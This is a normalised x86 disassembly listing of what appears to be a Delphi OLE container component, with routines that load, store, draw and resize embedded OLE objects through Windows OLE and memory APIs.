mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_46cfcf
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
test edi edi
je r-xdata
mov eax ebx
call sub_46db38
mov [ esi ] eax
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x21c ]
call sub_46ce48
mov eax [ ebp - 0x4 ]
call sub_46ce24
mov [ edi ] eax
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x21c ]
call sub_46ce48
mov eax [ ebp - 0x8 ]
call sub_46ce24
mov edx [ ebp + 0x18 ]
mov [ edx ] eax
mov eax [ ebp + 0x20 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x21c ]
call sub_46ce6c
mov eax [ ebp - 0xc ]
call sub_46ce24
mov edx [ ebp + 0x1c ]
mov [ edx ] eax
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cfd6
lea eax [ ebp - 0x10 ]
call sub_403fe8
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_40400c
retn
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_446764
mov eax [ ebp - 0x10 ]
call sub_46ce24
mov edx [ ebp + 0x20 ]
mov [ edx ] eax
sub_46d00c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
test esi esi
je r-xdata
test edi edi
je r-xdata
mov eax ebx
call sub_46da50
mov [ esi ] eax
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x220 ]
mov [ edi ] eax
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
mov eax [ ebp + 0x18 ]
xor edx edx
mov [ eax ] edx
sub_46d04c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0x14 ]
dec eax
je r-xdata
xor eax eax
jmp r-xdata
sub eax 0x3
je r-xdata
mov ecx [ ebp + 0x10 ]
mov edx eax
mov eax ebx
call sub_46e660
xor eax eax
pop ebx
pop ebp
retn 0x18
mov al 0x1
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_46da44
sub_46d0d0
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
cmp edx 0x1
sbb ecx ecx
inc ecx
cmp cl [ eax + 0x258 ]
je r-xdata
xor eax eax
pop ebp
retn 0x8
mov [ eax + 0x258 ] cl
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46d144
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
mov esi 0x1
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x250 ] 0x0
je r-xdata
mov eax ebx
call sub_46da44
test al al
jne r-xdata
xor esi esi
sub_46d17c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x23c ]
call sub_4058a8
push eax
push r-xdata
mov eax [ ebx + 0x21c ]
push eax
mov eax [ eax ]
call [ eax ]
lea eax [ ebx + 0x240 ]
call sub_4058a8
push eax
push r-xdata
mov eax [ ebx + 0x21c ]
push eax
mov eax [ eax ]
call [ eax ]
xor eax eax
pop ebx
pop ebp
retn 0x4
sub_46d1c2
add [ eax ] al
adc eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
pop ss
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov dl 0x1
call sub_46e970
xor eax eax
pop ebp
retn 0x4
sub_46d1f8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x14 ]
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor edx edx
mov [ eax ] edx
mov eax [ ebp + 0xc ]
mov edx [ ebx + 0x238 ]
call sub_4058c0
mov eax [ ebp + 0x10 ]
call sub_4058a8
cmp [ ebx + 0x284 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
lea edx [ ebp - 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebx + 0x30 ]
call sub_4462a8
mov eax ebx
call sub_4461ac
add eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_446168
add eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
call SetRect
push 0x3fff
push 0x3fff
push 0xffffc000
push 0xffffc000
mov eax [ ebp + 0x18 ]
push eax
call SetRect
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_416f14
push esi
push edi
lea esi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebp + 0x18 ]
push esi
mov esi edi
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
mov eax ebx
call sub_46d6a8
xor eax eax
mov [ esi + 0x4 ] eax
lea eax [ esi + 0x8 ]
push eax
mov eax [ ebx + 0x238 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov eax [ ebx + 0x244 ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x248 ]
mov [ esi + 0x10 ] eax
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_46d428
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
call sub_40591c
xor eax eax
push ebp
push sub_46d507
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi 0x80004005
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax ebx
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
call sub_4058a8
push eax
push r-xdata
mov eax [ ebx + 0x21c ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
jne r-xdata
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
sub eax 0xfffffd6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d50e
lea eax [ ebp - 0x4 ]
call sub_4058a8
lea eax [ ebp + 0xc ]
call sub_4058a8
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea eax [ ebp + 0xc ]
call sub_4058a8
push eax
push 0x0
push 0x0
mov eax ebx
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov esi eax
test esi esi
jne r-xdata
sub eax 0xfffffd6c
jmp r-xdata
mov [ ebx + 0x284 ] 0x1
lea eax [ ebx + 0x280 ]
mov edx [ ebp + 0xc ]
call sub_4058c0
push 0xffffffff
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x28 ]
mov eax ebx
call sub_46eb50
push 0xffffffff
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
xor esi esi
sub_46d517
add ch al
mov esp 0x4e68b722
sbb edx [ eax ]
mov [ 0xaa00bc ] al
inc eax
inc edi
jo r-xdata
call sub_445f44
mov dl 0x1
mov eax esi
call sub_44d288
xor edx edx
mov eax esi
call sub_446928
mov [ esi + 0x250 ] 0x1
mov [ esi + 0x251 ] 0x1
mov [ esi + 0x252 ] 0x2
mov [ esi + 0x253 ] 0x1
mov [ esi + 0x254 ] 0x1
mov [ esi + 0x255 ] 0x1
mov [ esi + 0x220 ] 0x1
mov eax esi
test bl bl
je r-xdata
push esi
test dl dl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44ecd8
mov [ esi + 0x210 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov edx 0x79
mov eax esi
call sub_445f20
mov edx 0x79
mov eax esi
sub_46d5ec
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax esi
call sub_46d7bc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44ed34
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_46d630
push ebx
add esp 0xfffffff8
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
pop ecx
pop edx
pop ebx
retn
cmp [ ebx + 0x257 ] 0x4
jne r-xdata
cmp [ ebx + 0x21c ] 0x0
je r-xdata
mov edx esp
lea eax [ ebx + 0x224 ]
call sub_46cd30
mov eax ebx
call sub_46da14
add eax eax
mov edx [ esp ]
add edx eax
push edx
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_46d6a8
push ebx
add esp 0xfffffff4
mov ebx eax
cmp [ ebx + 0x244 ] 0x0
jne r-xdata
add esp 0xc
pop ebx
retn
mov eax [ ebx + 0x238 ]
mov edx [ eax ]
call [ edx + 0x48 ]
mov eax [ eax + 0x248 ]
test eax eax
je r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp + 0x4 ] 0x2
mov [ esp + 0x8 ] 0x4
push esp
push 0x2
lea ecx [ ebx + 0x248 ]
lea edx [ ebx + 0x244 ]
call sub_45a848
sub_46d730
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44a394
push ebx
push sub_46def4
push ebx
push r-xdata
cmp [ ebx + 0x21c ] 0x0
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop esi
pop ebx
retn
sub_46d794
push ebx
mov ebx eax
mov eax [ ebx + 0x244 ]
test eax eax
je r-xdata
pop ebx
retn
push eax
call DestroyAcceleratorTable
xor eax eax
mov [ ebx + 0x244 ] eax
xor eax eax
mov [ ebx + 0x248 ] eax
sub_46d7bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_46d8e4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x21c ] 0x0
je r-xdata
lea eax [ ebx + 0x280 ]
call sub_4058a8
lea eax [ ebx + 0x21c ]
call sub_4058a8
lea eax [ ebx + 0x218 ]
call sub_4058a8
lea eax [ ebx + 0x214 ]
call sub_4058a8
mov eax ebx
call sub_46d900
mov eax ebx
call sub_46d794
cmp [ ebx + 0x234 ] 0x0
je r-xdata
xor edx edx
mov eax ebx
call sub_46ea78
cmp [ ebx + 0x230 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d8eb
lea eax [ ebp - 0x4 ]
call sub_4058a8
retn
mov eax [ ebx + 0x238 ]
cmp eax [ ebx + 0x234 ]
je r-xdata
push 0x1
mov eax [ ebx + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffb3
call sub_40346c
lea eax [ ebp - 0x4 ]
call sub_4058a8
push eax
push r-xdata
mov eax [ ebx + 0x21c ]
push eax
mov eax [ eax ]
call [ eax ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x234 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
lea eax [ ebx + 0x238 ]
call sub_4058a8
lea eax [ ebx + 0x234 ]
call sub_4058a8
mov edx ebx
mov eax [ ebx + 0x238 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebx + 0x230 ] eax
mov eax [ ebx + 0x230 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x28 ]
lea eax [ ebp - 0x4 ]
call sub_4058a8
sub_46d94c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_46d684
test esi esi
jle r-xdata
cmp esi 0xffff0000
jne r-xdata
cmp [ ebx + 0x22c ] 0x0
jne r-xdata
cmp [ ebx + 0x284 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebx + 0x22c ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jl r-xdata
mov eax ebx
call sub_46ec10
mov edx esp
mov eax ebx
call sub_446104
mov eax [ ebx + 0x30 ]
call sub_44d054
mov edi eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax ebx
call sub_44d054
mov edi eax
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x22c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
and ax 0xffff
movsx eax ax
mov esi eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
push eax
push 0x0
push esi
mov eax [ ebx + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x2c ]
call sub_46b2c4
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub eax 0xfffffd68
push esp
push edi
push 0x0
mov eax ebx
test eax eax
je r-xdata
sub_46da14
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
xor eax eax
retn
mov eax 0x1
cmp [ eax + 0x1a5 ] 0x0
je r-xdata
mov eax 0x2
jmp r-xdata
retn
sub_46da50
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46db19
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_46d684
xor esi esi
cmp [ ebx + 0x220 ] 0x4
jne r-xdata
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_4058a8
push eax
push r-xdata
mov eax [ ebx + 0x21c ]
push eax
mov eax [ eax ]
call [ eax ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46db20
lea eax [ ebp - 0x4 ]
call sub_4058a8
retn
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebx + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x3c ]
call sub_46b2c4
push 0xffffffff
push 0x0
lea eax [ ebp - 0x34 ]
push eax
call OleGetIconOfClass
mov esi eax
mov [ ebp - 0x18 ] 0x3
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x8 ] 0x20
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_415654
test al al
je r-xdata
mov esi [ ebp - 0x20 ]
sub_46db38
push ebx
push ecx
mov ebx eax
push esp
mov eax [ ebx + 0x214 ]
push eax
call GetHGlobalFromILockBytes
call sub_415654
test al al
je r-xdata
xor eax eax
pop edx
pop ebx
retn
mov eax [ esp ]
push eax
call GlobalSize
pop edx
pop ebx
retn
sub_46db80
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46dc8a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x253 ] 0x0
je r-xdata
mov eax ebx
call sub_447e98
mov ebx eax
cmp [ ebx + 0x21c ] 0x0
je r-xdata
mov eax ebx
call sub_46db64
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
cmp [ ebx + 0x24c ] 0x0
jne r-xdata
mov ebx [ ebx + 0x24c ]
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45af48
mov [ ebx + 0x24c ] eax
mov eax ebx
call sub_46db64
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dc91
lea eax [ ebp - 0xc ]
call sub_403fe8
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4565ac
mov esi eax
mov eax ebx
call sub_46db64
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4584c0
mov eax [ ebp - 0x4 ]
mov [ esi + 0xc ] eax
mov [ esi + 0x8c ] ebx
mov [ esi + 0x88 ] sub_46e354
mov eax [ ebx + 0x24c ]
mov eax [ eax + 0x34 ]
mov edx esi
call sub_4589d4
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
sub_46dc9c
push ebx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
sub_46dcc4
push ebp
mov ebp esp
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_46de8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_45e10c
mov esi eax
test esi esi
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call sub_46dc9c
mov esi eax
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_46ce90
mov edx [ ebp - 0x1c ]
lea eax [ ebx + 0x234 ]
call sub_4058c0
lea eax [ ebx + 0x238 ]
mov edx [ ebx + 0x234 ]
call sub_4058c0
mov edx ebx
mov eax [ ebx + 0x234 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x234 ]
mov edx [ eax ]
call [ edx + 0x48 ]
call sub_46ced4
test al al
je r-xdata
mov eax ebx
call sub_45e134
mov dl 0x1
mov eax ebx
call sub_46ea78
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_446764
mov edx [ ebp - 0x28 ]
lea eax [ ebp - 0x24 ]
call sub_404814
mov eax [ ebp - 0x24 ]
call sub_404824
push eax
lea edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_466a64
mov edx [ ebp - 0x30 ]
lea eax [ ebp - 0x2c ]
call sub_404814
mov eax [ ebp - 0x2c ]
call sub_404824
push eax
mov eax [ ebx + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
push 0xffffffff
mov eax [ ebx + 0x21c ]
push eax
call OleSetContainedObject
lea eax [ ebp - 0x4 ]
call sub_4058a8
push eax
push r-xdata
mov eax [ ebx + 0x21c ]
push eax
mov eax [ eax ]
call [ eax ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
call sub_46ce90
mov edx [ ebp - 0x20 ]
lea eax [ ebx + 0x238 ]
call sub_4058c0
mov edx ebx
mov eax [ ebx + 0x238 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46de91
lea eax [ ebp - 0x30 ]
call sub_403fe8
lea eax [ ebp - 0x2c ]
call sub_4046c8
lea eax [ ebp - 0x28 ]
call sub_403fe8
lea eax [ ebp - 0x24 ]
call sub_4046c8
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a64
lea eax [ ebp - 0x4 ]
call sub_4058a8
retn
mov [ ebp - 0x18 ] 0x0
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x8 ] 0xffffffff
lea eax [ ebx + 0x230 ]
push eax
test ebx ebx
je r-xdata
push ebx
push 0x1
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
sub ebx 0xfffffd70
sub_46de97
add [ esi ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_44be80
cmp [ ebx + 0x252 ] 0x0
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0xd
jne r-xdata
test [ esp ] 0x4
je r-xdata
mov edx 0xffff0000
mov eax ebx
call sub_46d94c
or edx 0xffffffff
mov eax ebx
call sub_46d94c
jmp r-xdata
mov [ esi ] 0x0
sub_46def4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_46d7bc
lea edx [ ebp - 0x14 ]
mov ecx 0xc
mov eax ebx
call sub_41ab94
cmp [ ebp - 0x14 ] 0x434f4442
je r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x2
call GlobalAlloc
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x256 ] 0x0
jne r-xdata
xor edx edx
push ebp
push j_sub_403738#2
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
xor edx edx
push ebp
push sub_46dfa6
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx eax
mov ecx [ ebp - 0xc ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dfad
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
retn
call sub_40b65c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
sub_46dfad
mov eax [ ebp - 0x4 ]
add eax 0x214
call sub_4058a8
push eax
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call CreateILockBytesOnHGlobal
call sub_46b2c4
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x218
call sub_4058a8
push eax
push 0x0
push 0x0
push 0x12
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call StgOpenStorageOnILockBytes
call sub_46b2c4
mov eax [ ebp - 0x4 ]
add eax 0x21c
call sub_4058a8
push eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push eax
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
call OleLoad
call sub_46b2c4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x220 ] edx
mov eax [ ebp - 0x4 ]
call sub_46dcc4
mov eax [ ebp - 0x4 ]
call sub_46ece4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0xfffffd68
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e059
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46d7bc
call sub_403a4c
call sub_403aa0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
push eax
call GlobalFree
sub_46e081
add [ eax ] al
add [ edx ] dl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
test bl bl
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_447d20
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_46e0e8
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x272 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov esi edx
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax ebx
call sub_46da14
push eax
push eax
lea eax [ esp + 0x8 ]
push eax
call InflateRect
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
sub_46e12c
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov ebx eax
cmp [ ebx + 0x284 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x1c ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_416f14
cmp [ ebx + 0x254 ] 0x1
jne r-xdata
cmp [ ebx + 0x259 ] 0x0
jne r-xdata
mov esi 0x4000
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x25c ] 0x0
je r-xdata
mov esi [ esp + 0x20 ]
sub esi [ esp + 0x18 ]
mov edi [ esp + 0x24 ]
sub edi [ esp + 0x1c ]
mov edx esp
lea eax [ ebx + 0x224 ]
call sub_46cd30
cmp [ ebx + 0x220 ] 0x1
jne r-xdata
mov esi 0xa00f
jmp r-xdata
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebx + 0x208 ]
call sub_424748
cmp [ ebx + 0x220 ] 0x4
je r-xdata
cmp [ ebx + 0x257 ] 0x2
jne r-xdata
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0x14 ]
xor edx edx
call sub_424200
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_4240e4
or esi 0x800
push esi
push 0xa
lea eax [ esp + 0x20 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_424b20
push eax
call DrawEdge
cmp [ ebx + 0x21c ] 0x0
je r-xdata
mov esi 0x200f
jmp r-xdata
mov eax [ esp ]
sub esi eax
sar esi 0x1
jns r-xdata
cmp [ ebx + 0x257 ] 0x1
je r-xdata
mov eax esi
mov ebp [ esp + 0x4 ]
imul ebp
mov edx edi
mov ecx [ esp ]
imul edx ecx
cmp eax edx
jle r-xdata
mov [ esp + 0x8 ] esi
mov edx [ esp + 0x4 ]
sub edi edx
sar edi 0x1
jns r-xdata
adc esi 0x0
cmp [ ebx + 0x257 ] 0x2
jne r-xdata
mov eax ebp
imul esi
cdq
idiv ecx
mov [ esp + 0x4 ] eax
mov [ esp ] esi
mov eax ecx
imul edi
cdq
idiv ebp
mov [ esp ] eax
mov [ esp + 0x4 ] edi
jmp r-xdata
mov [ esp + 0xc ] edi
mov ecx [ esp + 0x8 ]
add ecx eax
mov [ esp + 0x10 ] ecx
mov eax [ esp + 0xc ]
add eax edx
mov [ esp + 0x14 ] eax
jmp r-xdata
adc edi 0x0
cmp [ ebx + 0x257 ] 0x0
jne r-xdata
lea eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_424b20
push eax
mov eax [ ebx + 0x220 ]
push eax
mov eax [ ebx + 0x21c ]
push eax
call OleDraw
cmp [ ebx + 0x258 ] 0x0
je r-xdata
push edi
push esi
mov eax [ esp + 0x24 ]
push eax
mov eax [ esp + 0x24 ]
push eax
lea eax [ esp + 0x18 ]
push eax
call SetRect
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x24 ]
push eax
mov eax [ esp + 0x24 ]
push eax
lea eax [ esp + 0x18 ]
push eax
call SetRect
mov eax [ esp + 0x24 ]
push eax
mov eax [ esp + 0x24 ]
push eax
mov eax [ esp + 0x24 ]
push eax
mov eax [ esp + 0x24 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_424b20
push eax
call IntersectClipRect
jmp r-xdata
mov eax [ ebx + 0x208 ]
call sub_424b20
lea edx [ esp + 0x18 ]
call sub_46cd8c
sub_46e354
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403420
mov edx [ eax + 0xc ]
mov eax ebx
call sub_46d94c
pop esi
pop ebx
retn
sub_46e374
push ebp
